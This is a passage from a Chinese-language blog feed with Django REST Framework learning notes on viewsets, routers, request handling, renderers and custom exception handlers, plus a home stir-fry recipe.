<li><code>ViewSet</code>继承的是<code>APIView</code>视图类，用来完成不需要 <code>model</code> 类参与，或是非标准的 <code>model</code> 类操作接口，如<ul>
<li><code>post</code>请求在标准的 <code>model</code> 类操作下就是新增接口，登陆的<code>post</code>不满足。登陆的post请求，并不是完成数据的新增，只是用post提交数据，得到的结果也不是登陆的用户信息，而是登陆的认证信息</li>
<li><code>post</code>请求验证码的接口，不需要 <code>model</code> 类的参与</li>
</ul>
</li>
</ol>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><ul>
<li>GenericViewSet</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># viewsets.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericViewSet</span><span class="params">(ViewSetMixin, generics.GenericAPIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The GenericViewSet class does not provide any actions by default,</span></span><br><span class="line"><span class="string">    but does include the base set of generic view behavior, such as</span></span><br><span class="line"><span class="string">    the `get_object` and `get_queryset` methods.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># generics.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericAPIView</span><span class="params">(views.APIView)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ViewSet</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewSet</span><span class="params">(ViewSetMixin, views.APIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The base ViewSet class does not provide any actions by default.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

<h2 id="ModelViewSet-示例代码"><a href="#ModelViewSet-示例代码" class="headerlink" title="ModelViewSet 示例代码"></a>ModelViewSet 示例代码</h2><h3 id="路由层-urls-py-4"><a href="#路由层-urls-py-4" class="headerlink" title="路由层 urls.py"></a>路由层 urls.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v6/books/'</span>,</span><br><span class="line">         views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'list'</span>, <span class="string">'post'</span>: <span class="string">'create'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v6/books/&lt;pk&gt;/'</span>, </span><br><span class="line">        views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'retrieve'</span>, <span class="string">'put'</span>: <span class="string">'update'</span>, <span class="string">'patch'</span>: <span class="string">'partial_update'</span>, <span class="string">'delete'</span>: <span class="string">'destroy'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="视图层-views-py-4"><a href="#视图层-views-py-4" class="headerlink" title="视图层 views.py"></a>视图层 views.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelViewSet</span><span class="params">(ModelViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删不是数据库，而是该记录中的修改is_delete的值，因此重写默认的destroy函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        instance = self.get_object()  <span class="comment"># type: models.Book</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> instance:</span><br><span class="line">            <span class="keyword">return</span> APIResponse(<span class="number">1</span>, <span class="string">'删除失败'</span>)  <span class="comment"># 实际操作，在此之前就做了判断</span></span><br><span class="line">        instance.is_delete = <span class="literal">True</span></span><br><span class="line">        instance.save()</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'删除成功'</span>)</span><br></pre></td></tr></table></figure>

<h1 id="路由组件"><a href="#路由组件" class="headerlink" title="路由组件"></a>路由组件</h1><p>因为具有局限性，所以在开发复杂接口时并不是首选。</p>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> SimpleRouter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">router = SimpleRouter()</span><br><span class="line"><span class="comment"># 所有路由与ViewSet视图类的都可以注册，会产生 'v7/books/' 和 'v7/books/&lt;pk&gt;/'</span></span><br><span class="line">router.register(<span class="string">'v7/books'</span>, views.BookModelViewSet)</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># router.urls添加方法一</span></span><br><span class="line">    <span class="comment"># path('', include(router.urls)),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># router.urls添加方法二</span></span><br><span class="line"><span class="comment"># urlpatterns += router.urls</span></span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一图胜千言，非原创，均来自网络：</p>
<img data-src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/1.png" class="" title="图1">

<img data-src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/2.jpg" class="" title="图2">]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>二厨笔记 #2: 慢炒三丁「菜谱」</title>
    <url>/life/dog2s-cooking-notes-2/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Dog2’s Cooking Notes #2: Slowly Fried DingDingDing(Cookbook)</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本菜谱是根据<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9y">「下厨房」<i class="fa fa-external-link-alt"></i></span>菜谱<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9yZWNpcGUvMTAwMjg3NTY2Lw==">「毛豆肉丁炒茄子」<i class="fa fa-external-link-alt"></i></span> 改进而来。</p>
<p>改进后的菜谱在食材中去掉了茄丁，用胡萝卜丁替换，因茄丁按照原菜谱的处理方式仍比较吸盐，且原菜谱中处理茄丁不像烹制肉末茄子那样会使用过量油煎透，这会导致最终烹制的茄丁带有些许生茄特有的腥味。</p>
<p>后续佐料以及烹制方法也有较大改动，具体见新菜谱。</p>
<a id="more"></a>

<h2 id="腌制瘦肉-丝-丁-末"><a href="#腌制瘦肉-丝-丁-末" class="headerlink" title="腌制瘦肉(丝/丁/末)"></a>腌制瘦肉(丝/丁/末)</h2><p>在介绍正式菜谱之前，本节先介绍一下通用的瘦肉腌制方法。</p>
<p>不少经典菜谱都需要使用瘦肉，比如青椒肉丝、肉末茄子等，在炒制前对瘦肉进行腌制是一道必不可少的工序，腌制其实就是加入佐料拌匀静置片刻的简单过程，但不同菜谱中的腌制佐料不尽相同。因此这里介绍一下个人认为味道较好的腌制方式。</p>
<p>该方法正是从上节中的原菜谱中习得，也可运用到其他需腌制瘦肉的菜谱中，属于一种较好的通用姿势。</p>
<p><strong>腌制方法为：加入生抽、黄酒（料酒）、香油（芝麻油）、胡椒粉、淀粉（嫩肉粉），拌匀并静置10分钟以上。</strong></p>
<p>很多菜谱中介绍的腌制过程是需要加入盐的，但是经过一段时间实践我发现这是不需要且最好不要的，因为正如上一篇文章「食材吸盐度小结」中介绍，瘦肉属于较容易吸盐的食材，若腌制时加入盐，后续在炒制过程中还会再吸盐，最终可能导致炒出的菜唯独瘦肉过咸而导致整道菜的口感不平衡。</p>
<p>为了便于进一步体会，这里用青椒（木耳）肉丝的炒制过程作为示例：</p>
<ol>
<li>腌制完的瘦肉过油后盛起备用。</li>
<li>少量油入锅，爆香葱姜蒜末。</li>
<li>青椒丝、木耳入锅，加入适量生抽、料酒、香油、糖以及三分之二的盐，炒至加入液体挥发殆尽。</li>
<li>瘦肉入锅，加入三分之一的盐及少量水，翻炒至水挥发殆尽后完成。</li>
</ol>
<p>如上过程有如下几点需要注意：</p>
<ul>
<li>这里说各种佐料加入适量而没有具体数量值，是由于适量的值确实需要通过不断实践积累经验才能体会到，也就是“凭感觉”=.=，有一定经验后还需根据当次烹制时食材的量来权衡佐料的量。</li>
<li>这里所说的盐的量，是假设炒至这道菜所需的盐的总量为1，则在炒至青椒和木耳时放入总量的三分之二，加入瘦肉后再放入剩下三分之一。至于实际需盐的量，仍需根据经验判断。</li>
<li>之所以先加入三分之二的盐，是由于青椒和木耳的吸盐度相近，且远不如瘦肉，因此为了平衡最终不同食材的咸度，需要先放入大部分的盐炒制片刻，使部分盐被青椒和木耳吸收，在瘦肉入锅时，再放入剩下的三分之一，就能保证最终不同食材的咸度相近。</li>
<li>在烹制绝大多数菜的时候，都可以加入适量的糖用于提鲜。</li>
<li>最后一次加水，是为了让佐料均匀附着。因为此时锅中较干，几乎无水分，加入的佐料会粘着在食材表面，导致其不均匀分布，而仅用锅铲卜楞（翻炒）几下有时也并不能达到理想效果，因此需用少量水溶解后翻炒，效果最佳。</li>
</ul>
<h2 id="菜谱"><a href="#菜谱" class="headerlink" title="菜谱"></a>菜谱</h2><p>言归正传，介绍菜谱——慢炒三丁。</p>
<p>这道菜较为耗时，大概需要40分钟（准备食材约20分钟，烹制约20分钟）。</p>
<h3 id="1-用料"><a href="#1-用料" class="headerlink" title="1. 用料"></a>1. 用料</h3><table>
<thead>
<tr>
<th align="center">用料</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">猪肉</td>
<td align="center">肉切小丁腌制10分钟</td>
</tr>
<tr>
<td align="center">毛豆</td>
<td align="center">去外皮和里皮，里皮一定要去，否则难入味</td>
</tr>
<tr>
<td align="center">胡萝卜</td>
<td align="center">切小丁</td>
</tr>
<tr>
<td align="center">葱</td>
<td align="center">适量切末</td>
</tr>
<tr>
<td align="center">姜</td>
<td align="center">适量切片</td>
</tr>
<tr>
<td align="center">蒜</td>
<td align="center">适量切末</td>
</tr>
<tr>
<td align="center">王守义十三香</td>
<td align="center">这道菜的香味主要靠它，绝不可少哦</td>
</tr>
<tr>
<td align="center">生抽 料酒 芝麻油 淀粉 胡椒粉 味精（鸡精）</td>
<td align="center">适量</td>
</tr>
</tbody></table>
<p>至于食材具体用量，依然需要凭感觉^-^，可以参考下图：</p>
<img data-src="/life/dog2s-cooking-notes-2/1.jpg" class="" title="食材一览">

<h3 id="2-烹制过程"><a href="#2-烹制过程" class="headerlink" title="2. 烹制过程"></a>2. 烹制过程</h3><ol>
<li>一定量食用油入锅烧热，肉丁入锅炒至变色盛起待用。</li>
<li>再入少量食用油，葱姜蒜入锅爆香。</li>
<li>毛豆胡萝卜入锅，加入适量生抽、料酒、芝麻油、糖、三分之二的盐以及十三香，十三香可以稍微多一点，炒至加入液体挥发殆尽。糖的多少因人而异，二厨比较喜欢整道菜有淡淡的甜味，因此加得多点。</li>
<li>胡萝卜和毛豆较难熟透，因此需加入大量冷水进行大火煮制，具体的量以稍多于完全淹没锅中食材的量为佳，可以观察上图，此次用量为盛放毛豆的塑料碗一满碗。</li>
<li>在煮制15分钟左右直至加入的水已蒸发大部分而接近收汁时，肉丁入锅，加入适量味精（鸡精）和三分之一的盐，炒至锅中完全收汁。此时再加入少量水（200-300毫升），再炒至完全收汁即可出锅。</li>
</ol>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>本文以平衡不同食材的咸度为中心，坚持慢工细活儿和跟感觉走的两个基本点，介绍了二厨通过乱改菜谱、肆意烹调而妄图成为社会主义好大厨的过程。</p>
<p>这道菜较为耗时，因此不适合工作日烹制，那什么菜能在短时间内完成，以适合日益增多的奔波族呢？下一篇就会搜集一些懒人菜谱，以方便上班族们在回家后能简单快捷地吃上自己亲手打造的黑暗料理~</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Cooking</tag>
        <tag>Dog2&#39;s Cooking Notes</tag>
        <tag>Foodie</tag>
        <tag>Cookbook</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（二）：请求模块 request</title>
    <url>/tech/drf-learning-notes-2-the-request-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (2): the request module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="DRF请求生命周期流程"><a href="#DRF请求生命周期流程" class="headerlink" title="DRF请求生命周期流程"></a>DRF请求生命周期流程</h1><ol>
<li>根据应用中<code>urls.py</code>，走<code>as_view</code>方法，但是视图类没有该方法，所以请求走的是<code>APIView</code>的<code>as_view</code>方法</li>
<li>在<code>APIView</code>的<code>as_view</code>调用父类(django原生View)的<code>as_view</code>，同时还禁用了 csrf 认证</li>
<li>在父类（django原生View）的<code>as_view</code>中<code>dispatch</code>方法请求走的又是<code>APIView</code>的<code>dispatch</code><ul>
<li>因为<code>APIView</code>也可以走<code>dispatch</code>，视图类是先继承<code>APIView</code>，<code>APIView</code>中没有再去原生<code>View</code>中</li>
</ul>
</li>
<li>完成任务方法交给视图类的请求函数处理，得到请求的响应结果，返回给前台</li>
</ol>
<p>因此直接从APIView的dispatch入口看源码。</p>
<h1 id="请求模块"><a href="#请求模块" class="headerlink" title="请求模块"></a>请求模块</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/request.py" target="_blank" rel="noopener"><code>rest_framework.request</code></a><ul>
<li><code>rest_framework.request.Request</code>：主要类</li>
</ul>
</li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">API Guild - Requests<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在`APIView`类的`dispatch`方法中，二次封装request (请求模块)</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)   <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#点击查看Request源码</span></span><br><span class="line"><span class="keyword">return</span> Request(</span><br><span class="line">　　request,</span><br><span class="line">　　...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在rest_framework.request.Request实例化方法中</span></span><br><span class="line">self._request = request         <span class="comment">#将原生request作为drf request的_request属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在rest_framework.request.Request的__getattr__方法中</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">return</span> getattr(self._request, attr)  <span class="comment"># 访问属性完全兼容原生request</span></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">return</span> self.__getattribute__(attr)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>drf 对原生<code>request</code>做了二次封装，设置<code>request._request</code>等于原生<code>request</code></li>
<li>原生<code>request</code>对象的属性和方法都可以被drf的<code>request</code>对象直接访问(兼容)</li>
<li>drf请求的所有url拼接参数均被解析到<code>query_params</code>中，所有数据包数据都被<code>parser</code>解析到<code>data</code>中<ul>
<li>get请求：url中拼接的参数通过<code>request.query_params</code>获取</li>
<li>post请求：所有请求方式所携带的数据包都是通过<code>request.data</code>获取</li>
</ul>
</li>
</ol>
<h2 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># url拼接的参数</span></span><br><span class="line">        print(request._request.GET)  <span class="comment"># 二次封装方式</span></span><br><span class="line">        print(request.GET) <span class="comment"># 兼容</span></span><br><span class="line">        print(request.query_params) <span class="comment"># 拓展</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 所有请求方式携带的数据包</span></span><br><span class="line">        print(request._request.POST)  <span class="comment"># 二次封装方式</span></span><br><span class="line">        print(request.POST)  <span class="comment"># 兼容</span></span><br><span class="line">        print(request.data)  <span class="comment"># 拓展，兼容性最强，三种传参方式都可以：form-data,urlencoding,json</span></span><br><span class="line"></span><br><span class="line">        print(request.query_params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（三）：渲染模块 renders</title>
    <url>/tech/drf-learning-notes-3-the-renders-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (3): the renders module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<p>用DRF做测试会发现，用浏览器请求API返回DRF定制的页面，对开发者相当友好，如下图：</p>
<p><img data-src="https://www.django-rest-framework.org/img/quickstart.png" alt=""></p>
<p>而若使用python第三方模块requests或者postman等工具，这则返回的是原生的json数据。</p>
<p>实现这种差别响应的，正是本节的主角——(响应)渲染模块。</p>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/renders.py" target="_blank" rel="noopener"><code>rest_framework.renders</code></a><ul>
<li><code>rest_framework.request.Request</code>：主要类</li>
</ul>
</li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVuZGVyZXJzLw==">API Guild - Renderers<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在`APIView`类的`dispatch`方法中，最后解析reponse对象数据</span></span><br><span class="line">self.response = self.finalize_response(request, response, *args, **kwargs) <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到运行的解析类的对象们</span></span><br><span class="line">neg = self.perform_content_negotiation(request, force=<span class="literal">True</span>)   <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得解析类对象</span></span><br><span class="line">renderers = self.get_renderers()   <span class="comment">#点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从视图类中得到renderer_classes请求类，如何实例化一个个对象形参解析类对象列表</span></span><br><span class="line"><span class="keyword">return</span> [renderer() <span class="keyword">for</span> renderer <span class="keyword">in</span> self.renderer_classes]  <span class="comment">#配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># self.renderer_classes为APIView类属性</span></span><br><span class="line">renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings中的默认渲染类</span></span><br><span class="line"><span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,</span><br><span class="line">        <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>调用链如下：</p>
<ol>
<li>自己视图类的类属性(局部配置)</li>
<li><code>APIView</code>类的类属性设置</li>
<li>自己配置文件的<code>DEFAULT_RENDERER_CLASSES</code>(全局配置)</li>
<li>drf配置文件的<code>DEFAULT_RENDERER_CLASSES</code></li>
</ol>
<h1 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h1><h2 id="自定义全局配置"><a href="#自定义全局配置" class="headerlink" title="自定义全局配置"></a>自定义全局配置</h2><p>所有视图类统一处理，在项目的<code>settings.py</code>中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># drf提供的渲染类</span></span><br><span class="line">    <span class="string">'DEFAULT_RENDERER_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.renderers.JSONRenderer'</span>,       <span class="comment">#只显示出json数据</span></span><br><span class="line">      <span class="string">'rest_framework.renderers.BrowsableAPIRenderer'</span>,    <span class="comment">#渲染出页面，注意是BrowsableAPIRenderer</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义局部配置"><a href="#自定义局部配置" class="headerlink" title="自定义局部配置"></a>自定义局部配置</h2><p>某一个或一些实体类单独处理，在<code>views.py</code>视图类中提供对应的类属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在setting.py中配置REST_FRAMEWORK，完成的是全局配置，所有接口统一处理</span></span><br><span class="line"><span class="comment"># 如果只有部分接口特殊化，可以完成 - 局部配置</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.renderers <span class="keyword">import</span> JSONRenderer</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># 局部配置</span></span><br><span class="line">    renderer_classes = [JSONRenderer]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok 2'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok 2'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（五）：异常模块 exceptions</title>
    <url>/tech/drf-learning-notes-5-the-exceptions-module/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (5): the exceptions module</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li>源码：<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/exceptions.py" target="_blank" rel="noopener"><code>rest_framework.exceptions</code></a></li>
<li>官方文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZXhjZXB0aW9ucy8=">API Guild - Exceptions<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzVfZHJmX2V4Y2VwdGlvbg==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h2 id="DRF异常处理"><a href="#DRF异常处理" class="headerlink" title="DRF异常处理"></a>DRF异常处理</h2><ol>
<li>所有经过drf的<code>APIView</code>视图类产生的异常，都可以提供异常处理方案</li>
<li>drf默认提供了异常处理方案<code>rest_framework.views.exception_handler</code>，但是处理范围有限</li>
<li>drf提供的处理方案两种，处理了返回异常现象，没处理返回None(后续就是服务器抛异常给前台)</li>
</ol>
<p>通常出于一些原因我们需要自定义异常处理，而非使用DRF的默认异常。</p>
<h2 id="基于DRF自定义异常处理"><a href="#基于DRF自定义异常处理" class="headerlink" title="基于DRF自定义异常处理"></a>基于DRF自定义异常处理</h2><p>自定义异常处理的常见应用场景如下：</p>
<ol>
<li>解决drf没有处理的异常</li>
<li>让前台得到合理的异常信息返回、隐藏异常细节而返回通用异常信息</li>
<li>后台记录异常具体信息、如将异常细节写入日志以供审计等</li>
</ol>
<a id="more"></a>

<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异常模块：APIView类的dispatch方法中</span></span><br><span class="line">response = self.handle_exception(exc)  <span class="comment"># 点进去</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自定义异常就是提供异常处理函数exception_handler,处理的目的就是让response一定有值</span></span><br><span class="line"><span class="comment">#自定义：自己写exception_handler函数，在自己的配置文件配置EXCEPTION_HANDLER指向自己的处理异常函数</span></span><br><span class="line">exception_handler = self.get_exception_handler() <span class="comment">#点进去 #获取处理异常的方法，也可以自定义异常处理方法，在settings文件中配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#settings中获取异常处理的方式</span></span><br><span class="line"><span class="keyword">return</span> self.settings.EXCEPTION_HANDLER</span><br><span class="line"></span><br><span class="line"><span class="comment"># APIView类属性settings</span></span><br><span class="line">settings = api_settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings中定义的默认异常处理函数，又指向回了views.exception_handler函数</span></span><br><span class="line"><span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'rest_framework.views.exception_handler'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常处理的结果</span></span><br><span class="line"><span class="comment"># 自定义异常就是提供exception_handler异常处理函数，处理的目的就是让response一定有值</span></span><br><span class="line">response = exception_handler(exc, context)   <span class="comment">#最后发现在views中的exception_handler就是处理异常的方法</span></span><br></pre></td></tr></table></figure>

<p>从<code>dispatch中的handle_exception</code>进入，<code>get_exception_handler()</code>获得处理异常方法<code>exception_handler()</code>，在这里也可以自定义异常方法。执行<code>exception_handler()</code>获取异常处理的结果。</p>
<h1 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h1><h2 id="自定义全局配置"><a href="#自定义全局配置" class="headerlink" title="自定义全局配置"></a>自定义全局配置</h2><p>这是视频教程里的做法，它对于所有视图都采用自己定制的异常处理函数。</p>
<ol>
<li>在项目的<code>settings.py</code>中</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改自己的配置文件setting.py</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 全局配置异常模块</span></span><br><span class="line">    <span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'api.exception.exception_handler'</span>,  <span class="comment">#设置自定义异常文件路径，在api应用下创建exception文件，exception_handler函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建自定义异常处理函数，函数内部逻辑一般为<ol>
<li>先将异常处理交给<code>rest_framework.views</code>的<code>exception_handler</code>去处理</li>
<li>判断处理的结果(返回值)<code>response</code>，有值代表drf已经处理了，<code>None</code>代表drf处理不了的异常，需要自定义去处理</li>
</ol>
</li>
</ol>
<p>api应用下创建处理异常文件exception.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义异常处理文件exception，重写exception_handler函数</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler   <span class="comment">#drf原生处理异常函数取别名 drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(exc, context)</span>:</span>  <span class="comment">#自定义处理异常函数</span></span><br><span class="line">    <span class="comment"># drf的exception_handler做基础处理</span></span><br><span class="line">    response = drf_exception_handler(exc, context)</span><br><span class="line">    <span class="comment"># 